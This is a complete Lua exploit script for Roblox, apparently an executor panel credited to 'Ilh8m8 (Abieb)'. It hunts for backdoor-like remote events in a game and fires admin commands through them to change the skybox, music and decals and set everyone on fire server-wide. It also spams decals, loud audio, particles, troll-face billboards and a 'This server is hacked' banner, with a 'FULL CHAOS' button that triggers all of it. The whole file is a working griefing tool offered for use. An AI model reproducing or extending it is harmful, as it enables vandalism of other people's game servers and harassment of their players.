local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local SKY_IMAGE = "rbxassetid://116786398220383"
local TROLL_FACE = "rbxassetid://99631311052606"
local AUDIO_ID = "rbxassetid://125425233033462"
local SKELLY_IMAGE = "rbxassetid://111119826476498"
local EYE_IMAGE = "rbxassetid://106604597151648"

local backdoors = {}

for _, obj in pairs(game:GetDescendants()) do
    pcall(function()
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local n = obj.Name:lower()
            if n:find("backdoor") or n:find("bd_") or n:find("hidden")
                or n:find("require") or n:find("load") or n:find("exec")
                or n:find("run") or n:find("main") or n:find("core")
                or n:find("event") or n:find("remote") or n:find("link")
                or n:find("signal") or n:find("comm") or n:find("fire")
                or #obj.Name <= 3 then
                table.insert(backdoors, obj)
            end
        end
    end)
end

function FireAll(payloads)
    for _, remote in pairs(backdoors) do
        for _, p in ipairs(payloads) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(unpack(p))
                else
                    remote:InvokeServer(unpack(p))
                end
            end)
            task.wait(0.5)
        end
    end
end

function SRVSkybox(id)
    FireAll({{":skybox " .. id}, {"skybox", id}})
end

function SRVAudio(id)
    FireAll({{":music " .. id}, {"music", id}})
end

function SRVDecals(id)
    FireAll({{":decal all " .. id}, {"decal", "all", id}})
end

function SRVFire()
    FireAll({{":fire all"}, {"fire", "all"}})
end

-- ==========================================
-- CLIENT PAYLOADS
-- ==========================================

function CLISkybox(id)
    local old = Lighting:FindFirstChild("Ilh8m8Sky")
    if old then old:Destroy() end
    local sky = Instance.new("Sky")
    sky.Name = "Ilh8m8Sky"
    sky.SkyboxBk = id
    sky.SkyboxDn = id
    sky.SkyboxFt = id
    sky.SkyboxLf = id
    sky.SkyboxRt = id
    sky.SkyboxUp = id
    sky.Parent = Lighting
end

function CLIAudio(id)
    local old = SoundService:FindFirstChild("Ilh8m8Audio")
    if old then old:Destroy() end
    local s = Instance.new("Sound")
    s.Name = "Ilh8m8Audio"
    s.SoundId = id
    s.Volume = 10
    s.Looped = true
    s.Parent = SoundService
    s:Play()
end

function CLIDecals(id)
    for _, obj in pairs(workspace:GetDescendants()) do
        pcall(function()
            if obj:IsA("BasePart") then
                local faces = {Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Left,
                              Enum.NormalId.Right, Enum.NormalId.Top, Enum.NormalId.Bottom}
                for _, face in ipairs(faces) do
                    local d = Instance.new("Decal")
                    d.Name = "Ilh8m8Decal"
                    d.Texture = id
                    d.Face = face
                    d.Parent = obj
                end
            end
        end)
    end
end

function CLIDisco()
    task.spawn(function()
        local hue = 0
        local connections = {}
        while true do
            task.wait(0.05)
            hue = hue + 0.08
            if hue > 1 then hue = hue - 1 end
            pcall(function()
                local col = Color3.fromHSV(hue, 1, 1)
                local col2 = Color3.fromHSV((hue + 0.5) % 1, 1, 1)
                Lighting.Ambient = col
                Lighting.OutdoorAmbient = col2
                Lighting.FogColor = col
                Lighting.Brightness = 3 + math.sin(tick() * 8) * 2
                Lighting.ClockTime = 14
                Lighting.ColorShift_Top = col
                Lighting.ColorShift_Bottom = col2
                Lighting.ExposureCompensation = math.sin(tick() * 5) * 1.5
            end)
        end
    end)
end

function CLIFire()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local head = plr.Character:FindFirstChild("Head")
                if head and not head:FindFirstChild("Ilh8m8Fire") then
                    local f = Instance.new("Fire")
                    f.Name = "Ilh8m8Fire"
                    f.Size = 15
                    f.Heat = 25
                    f.Color = Color3.new(1, 0.1, 0)
                    f.SecondaryColor = Color3.new(0.5, 0, 0)
                    f.Parent = head
                end
            end
        end)
    end
end

function CLIParticles(imgId, rate)
    rate = rate or 100
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local head = plr.Character:FindFirstChild("Head")
                if head then
                    local old = head:FindFirstChild("Ilh8m8Attach")
                    if old then old:Destroy() end
                    local attach = Instance.new("Attachment")
                    attach.Name = "Ilh8m8Attach"
                    attach.Parent = head

                    local p = Instance.new("ParticleEmitter")
                    p.Name = "Ilh8m8Particles"
                    p.Texture = imgId
                    p.Rate = rate
                    p.Lifetime = NumberRange.new(2, 5)
                    p.Speed = NumberRange.new(10, 30)
                    p.SpreadAngle = Vector2.new(360, 360)
                    p.Size = NumberSequence.new({
                        NumberSequenceKeypoint.new(0, 3),
                        NumberSequenceKeypoint.new(0.5, 2),
                        NumberSequenceKeypoint.new(1, 0.5)
                    })
                    p.Transparency = NumberSequence.new({
                        NumberSequenceKeypoint.new(0, 0.1),
                        NumberSequenceKeypoint.new(0.8, 0.5),
                        NumberSequenceKeypoint.new(1, 1)
                    })
                    p.Rotation = NumberRange.new(0, 360)
                    p.RotSpeed = NumberRange.new(-180, 180)
                    p.Acceleration = Vector3.new(0, 20, 0)
                    p.LightEmission = 0.5
                    p.Enabled = true
                    p.Parent = attach

                    local p2 = Instance.new("ParticleEmitter")
                    p2.Name = "Ilh8m8Particles2"
                    p2.Texture = imgId
                    p2.Rate = rate / 2
                    p2.Lifetime = NumberRange.new(3, 6)
                    p2.Speed = NumberRange.new(20, 40)
                    p2.SpreadAngle = Vector2.new(360, 360)
                    p2.Size = NumberSequence.new({
                        NumberSequenceKeypoint.new(0, 4),
                        NumberSequenceKeypoint.new(1, 1)
                    })
                    p2.Transparency = NumberSequence.new({
                        NumberSequenceKeypoint.new(0, 0.3),
                        NumberSequenceKeypoint.new(1, 1)
                    })
                    p2.Acceleration = Vector3.new(0, 30, 0)
                    p2.Enabled = true
                    p2.Parent = attach
                end
            end
        end)
    end
end

function CLITroll(imgId)
    imgId = imgId or TROLL_FACE
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local head = plr.Character:FindFirstChild("Head")
                if head and not head:FindFirstChild("Ilh8m8TrollBillboard") then
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "Ilh8m8TrollBillboard"
                    billboard.Size = UDim2.new(3, 0, 3, 0)
                    billboard.AlwaysOnTop = true
                    billboard.MaxDistance = 1000
                    billboard.Adornee = head
                    billboard.Parent = head

                    local img = Instance.new("ImageLabel")
                    img.Size = UDim2.new(1, 0, 1, 0)
                    img.BackgroundTransparency = 1
                    img.Image = imgId
                    img.ScaleType = Enum.ScaleType.Stretch
                    img.Parent = billboard
                end
            end
        end)
    end
end

function CLIZombie()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local char = plr.Character
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then
                    local animator = char:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                            track:Stop(0)
                        end
                    end

                    local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
                    if torso then
                        local rShoulder = torso:FindFirstChild("Right Shoulder") or torso:FindFirstChild("RightShoulder")
                        local lShoulder = torso:FindFirstChild("Left Shoulder") or torso:FindFirstChild("LeftShoulder")

                        if rShoulder and lShoulder then
                            -- simpan original C0 untuk restore
                            if not rShoulder:GetAttribute("OrigC0") then
                                rShoulder:SetAttribute("OrigC0X", rShoulder.C0.X)
                                rShoulder:SetAttribute("OrigC0Y", rShoulder.C0.Y)
                                rShoulder:SetAttribute("OrigC0Z", rShoulder.C0.Z)
                                lShoulder:SetAttribute("OrigC0X", lShoulder.C0.X)
                                lShoulder:SetAttribute("OrigC0Y", lShoulder.C0.Y)
                                lShoulder:SetAttribute("OrigC0Z", lShoulder.C0.Z)
                            end

                            task.spawn(function()
                                local t = tick()
                                while torso.Parent do
                                    pcall(function()
                                        -- zombie arms: kedua tangan lurus ke depan
                                        local sway = math.sin(tick() * 5) * 0.1
                                        rShoulder.C0 = CFrame.new(1, 0.5, 0) * CFrame.Angles(math.rad(-90) + sway, 0, 0)
                                        lShoulder.C0 = CFrame.new(-1, 0.5, 0) * CFrame.Angles(math.rad(-90) - sway, 0, 0)
                                    end)
                                    task.wait()
                                end
                            end)
                        end
                    end
                end
            end
        end)
    end
end

function CLIBitbox()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local char = plr.Character
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp and not hrp:FindFirstChild("Ilh8m8Bitbox") then
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "Ilh8m8Bitbox"
                    billboard.Size = UDim2.new(4, 0, 2, 0)
                    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
                    billboard.AlwaysOnTop = true
                    billboard.MaxDistance = 1000
                    billboard.Parent = hrp

                    local txt = Instance.new("TextLabel")
                    txt.Size = UDim2.new(1, 0, 1, 0)
                    txt.BackgroundTransparency = 1
                    txt.Text = "01001000 01000001 01000011 01001011"
                    txt.TextColor3 = Color3.new(1, 0, 0)
                    txt.TextScaled = true
                    txt.Font = Enum.Font.Code
                    txt.TextStrokeTransparency = 0.5
                    txt.TextStrokeColor3 = Color3.new(0, 0, 0)
                    txt.Rotation = math.random(-10, 10)
                    txt.Parent = billboard

                    task.spawn(function()
                        while billboard.Parent do
                            task.wait(0.2)
                            local bits = ""
                            for i = 1, 32 do
                                bits = bits .. tostring(math.random(0, 1))
                                if i % 8 == 0 then bits = bits .. " " end
                            end
                            txt.Text = bits
                            txt.Rotation = math.random(-15, 15)
                            txt.TextColor3 = Color3.new(1, math.random(0, 0.3), 0)
                        end
                    end)
                end
            end
        end)
    end
end

function CLIHint()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local pg = plr:FindFirstChild("PlayerGui")
            if pg then
                local old = pg:FindFirstChild("Ilh8m8Hint")
                if old then old:Destroy() end

                local gui = Instance.new("ScreenGui")
                gui.Name = "Ilh8m8Hint"
                gui.ResetOnSpawn = false
                gui.IgnoreGuiInset = true
                gui.DisplayOrder = 999999
                gui.Parent = pg

                local bar = Instance.new("Frame")
                bar.Size = UDim2.new(1, 0, 0, 34)
                bar.BackgroundColor3 = Color3.new(0, 0, 0)
                bar.BackgroundTransparency = 0.3
                bar.BorderSizePixel = 0
                bar.ZIndex = 999999
                bar.Parent = gui

                local txt = Instance.new("TextLabel")
                txt.Size = UDim2.new(1, 0, 1, 0)
                txt.BackgroundTransparency = 1
                txt.Text = "This server is hacked by Ilh8m8 (Abieb)"
                txt.TextColor3 = Color3.new(1, 0.2, 0)
                txt.TextScaled = true
                txt.Font = Enum.Font.SourceSansBold
                txt.ZIndex = 999999
                txt.Parent = bar
            end
        end)
    end
end

-- ==========================================
-- PANEL — SEIMBANG & LEBAR
-- ==========================================

local panel = Instance.new("ScreenGui")
panel.Name = "Ilh8m8_Panel"
panel.ResetOnSpawn = false
panel.DisplayOrder = 999998
panel.Parent = LocalPlayer:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 340, 0, 320)
main.Position = UDim2.new(0.5, -170, 0.5, -160)
main.BackgroundColor3 = Color3.new(1, 1, 1)
main.BorderSizePixel = 1
main.BorderColor3 = Color3.new(0, 0, 0)
main.Parent = panel

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 28)
titleBar.BackgroundColor3 = Color3.new(0, 0, 0)
titleBar.BorderSizePixel = 0
titleBar.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 1, 0)
title.Position = UDim2.new(0, 6, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Ilh8m8 (Abieb) Panel"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 13
title.Font = Enum.Font.Code
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 28, 1, 0)
closeBtn.Position = UDim2.new(1, -28, 0, 0)
closeBtn.BackgroundColor3 = Color3.new(0.8, 0, 0)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 14
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = titleBar

local container = Instance.new("ScrollingFrame")
container.Size = UDim2.new(1, 0, 1, -28)
container.Position = UDim2.new(0, 0, 0, 28)
container.BackgroundColor3 = Color3.new(1, 1, 1)
container.BorderSizePixel = 0
container.ScrollBarThickness = 6
container.CanvasSize = UDim2.new(0, 0, 0, 0)
container.Parent = main

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 0)
layout.Parent = container

local function Section(text)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, 0, 0, 18)
    l.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
    l.Text = text
    l.TextColor3 = Color3.new(0, 0, 0)
    l.TextSize = 10
    l.Font = Enum.Font.Code
    l.BorderSizePixel = 0
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = container
end

local function Btn(text, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0.5, 0, 0, 26)
    b.BackgroundColor3 = Color3.new(1, 1, 1)
    b.Text = text
    b.TextColor3 = Color3.new(0, 0, 0)
    b.TextSize = 10
    b.Font = Enum.Font.Code
    b.BorderSizePixel = 1
    b.BorderColor3 = Color3.new(0, 0, 0)
    b.Parent = container
    b.MouseButton1Down:Connect(function()
        pcall(cb)
    end)
    b.MouseEnter:Connect(function()
        b.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
    end)
    b.MouseLeave:Connect(function()
        b.BackgroundColor3 = Color3.new(1, 1, 1)
    end)
end

local function BtnWide(text, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 0, 26)
    b.BackgroundColor3 = Color3.new(0.85, 0.15, 0.15)
    b.Text = text
    b.TextColor3 = Color3.new(1, 1, 1)
    b.TextSize = 11
    b.Font = Enum.Font.Code
    b.BorderSizePixel = 1
    b.BorderColor3 = Color3.new(0, 0, 0)
    b.Parent = container
    b.MouseButton1Down:Connect(function()
        pcall(cb)
    end)
end

local function InputRow(labelText, placeholderText, defaultText, cb)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 24)
    row.BackgroundColor3 = Color3.new(1, 1, 1)
    row.BorderSizePixel = 0
    row.Parent = container

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0, 80, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = labelText
    lbl.TextColor3 = Color3.new(0, 0, 0)
    lbl.TextSize = 9
    lbl.Font = Enum.Font.Code
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = row

    local box = Instance.new("TextBox")
    box.Size = UDim2.new(1, -90, 1, -2)
    box.Position = UDim2.new(0, 85, 0, 1)
    box.BackgroundColor3 = Color3.new(0.95, 0.95, 0.95)
    box.Text = defaultText or ""
    box.PlaceholderText = placeholderText
    box.PlaceholderColor3 = Color3.new(0.5, 0.5, 0.5)
    box.TextColor3 = Color3.new(0, 0, 0)
    box.TextSize = 9
    box.Font = Enum.Font.Code
    box.ClearTextOnFocus = false
    box.BorderSizePixel = 1
    box.BorderColor3 = Color3.new(0, 0, 0)
    box.Parent = row

    local go = Instance.new("TextButton")
    go.Size = UDim2.new(0, 30, 1, 0)
    go.Position = UDim2.new(1, 0, 0, 0)
    go.BackgroundColor3 = Color3.new(0.85, 0.15, 0.15)
    go.Text = "GO"
    go.TextColor3 = Color3.new(1, 1, 1)
    go.TextSize = 9
    go.Font = Enum.Font.Code
    go.BorderSizePixel = 0
    go.Parent = row

    go.MouseButton1Down:Connect(function()
        local val = box.Text
        if val ~= "" then
            pcall(function() cb(val) end)
        end
    end)

    return box
end

local skyBox, decalBox, particleBox, audioBox

Section("── ASSET ID INPUTS ──")
skyBox = InputRow("SKYBOX", "asset id...", "116786398220383", function(v) CLISkybox("rbxassetid://" .. v) SRVSkybox("rbxassetid://" .. v) end)
decalBox = InputRow("DECALS", "asset id...", "116786398220383", function(v) CLIDecals("rbxassetid://" .. v) SRVDecals("rbxassetid://" .. v) end)
particleBox = InputRow("PARTICLE", "asset id...", "116786398220383", function(v) CLIParticles("rbxassetid://" .. v, 100) end)
audioBox = InputRow("AUDIO", "asset id...", "125425233033462", function(v) CLIAudio("rbxassetid://" .. v) SRVAudio("rbxassetid://" .. v) end)

Section("── PAYLOADS ──")
local row1 = Instance.new("Frame")
row1.Size = UDim2.new(1, 0, 0, 26)
row1.BackgroundTransparency = 1
row1.Parent = container
local rl1 = Instance.new("UIListLayout")
rl1.FillDirection = Enum.FillDirection.Horizontal
rl1.Parent = row1

local function BtnRow(parent, text, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0.5, 0, 1, 0)
    b.BackgroundColor3 = Color3.new(1, 1, 1)
    b.Text = text
    b.TextColor3 = Color3.new(0, 0, 0)
    b.TextSize = 10
    b.Font = Enum.Font.Code
    b.BorderSizePixel = 1
    b.BorderColor3 = Color3.new(0, 0, 0)
    b.Parent = parent
    b.MouseButton1Down:Connect(function()
        pcall(cb)
    end)
    b.MouseEnter:Connect(function()
        b.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
    end)
    b.MouseLeave:Connect(function()
        b.BackgroundColor3 = Color3.new(1, 1, 1)
    end)
end

BtnRow(row1, "SKYBOX", function() CLISkybox("rbxassetid://" .. (skyBox.Text ~= "" and skyBox.Text or "116786398220383")) end)
BtnRow(row1, "AUDIO", function() CLIAudio("rbxassetid://" .. (audioBox.Text ~= "" and audioBox.Text or "125425233033462")) end)

local row2 = Instance.new("Frame")
row2.Size = UDim2.new(1, 0, 0, 26)
row2.BackgroundTransparency = 1
row2.Parent = container
local rl2 = Instance.new("UIListLayout")
rl2.FillDirection = Enum.FillDirection.Horizontal
rl2.Parent = row2

BtnRow(row2, "SPAM DECALS", function() CLIDecals("rbxassetid://" .. (decalBox.Text ~= "" and decalBox.Text or "116786398220383")) end)
BtnRow(row2, "DISCO", function() CLIDisco() end)

local row3 = Instance.new("Frame")
row3.Size = UDim2.new(1, 0, 0, 26)
row3.BackgroundTransparency = 1
row3.Parent = container
local rl3 = Instance.new("UIListLayout")
rl3.FillDirection = Enum.FillDirection.Horizontal
rl3.Parent = row3

BtnRow(row3, "FIRE ALL", function() SRVFire() CLIFire() end)
BtnRow(row3, "PARTICLES", function() CLIParticles("rbxassetid://" .. (particleBox.Text ~= "" and particleBox.Text or "116786398220383"), 100) end)

local row4 = Instance.new("Frame")
row4.Size = UDim2.new(1, 0, 0, 26)
row4.BackgroundTransparency = 1
row4.Parent = container
local rl4 = Instance.new("UIListLayout")
rl4.FillDirection = Enum.FillDirection.Horizontal
rl4.Parent = row4

BtnRow(row4, "TROLL FACE", function() CLITroll(TROLL_FACE) end)
BtnRow(row4, "SKELLY", function() CLITroll(SKELLY_IMAGE) end)

local row5 = Instance.new("Frame")
row5.Size = UDim2.new(1, 0, 0, 26)
row5.BackgroundTransparency = 1
row5.Parent = container
local rl5 = Instance.new("UIListLayout")
rl5.FillDirection = Enum.FillDirection.Horizontal
rl5.Parent = row5

BtnRow(row5, "EYE", function() CLITroll(EYE_IMAGE) end)
BtnRow(row5, "ZOMBIE ARMS", function() CLIZombie() end)

local row6 = Instance.new("Frame")
row6.Size = UDim2.new(1, 0, 0, 26)
row6.BackgroundTransparency = 1
row6.Parent = container
local rl6 = Instance.new("UIListLayout")
rl6.FillDirection = Enum.FillDirection.Horizontal
rl6.Parent = row6

BtnRow(row6, "BITBOX RED", function() CLIBitbox() end)
BtnRow(row6, "HINT", function() CLIHint() end)

BtnWide("FULL CHAOS", function()
    CLISkybox("rbxassetid://" .. (skyBox.Text ~= "" and skyBox.Text or "116786398220383"))
    CLIAudio("rbxassetid://" .. (audioBox.Text ~= "" and audioBox.Text or "125425233033462"))
    CLIDecals("rbxassetid://" .. (decalBox.Text ~= "" and decalBox.Text or "116786398220383"))
    CLIDisco()
    CLIFire()
    CLIParticles("rbxassetid://" .. (particleBox.Text ~= "" and particleBox.Text or "116786398220383"), 150)
    CLITroll(TROLL_FACE)
    CLIZombie()
    CLIBitbox()
    CLIHint()
    SRVSkybox("rbxassetid://" .. (skyBox.Text ~= "" and skyBox.Text or "116786398220383"))
    SRVAudio("rbxassetid://" .. (audioBox.Text ~= "" and audioBox.Text or "125425233033462"))
    SRVDecals("rbxassetid://" .. (decalBox.Text ~= "" and decalBox.Text or "116786398220383"))
    SRVFire()
end)

closeBtn.MouseButton1Down:Connect(function()
    panel:Destroy()
end)

local dragging = false
local dragStart = nil
local startPos = nil

titleBar.InputBegan:Connect(function(inputObj)
    if inputObj.UserInputType == Enum.UserInputType.MouseButton1 or inputObj.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = inputObj.Position
        startPos = main.Position
    end
end)

UserInputService.InputChanged:Connect(function(inputObj)
    if dragging then
        if inputObj.UserInputType == Enum.UserInputType.MouseMovement or inputObj.UserInputType == Enum.UserInputType.Touch then
            local delta = inputObj.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end
end)

UserInputService.InputEnded:Connect(function(inputObj)
    if inputObj.UserInputType == Enum.UserInputType.MouseButton1 or inputObj.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

print("Ilh8m8 (Abieb) Panel loaded")
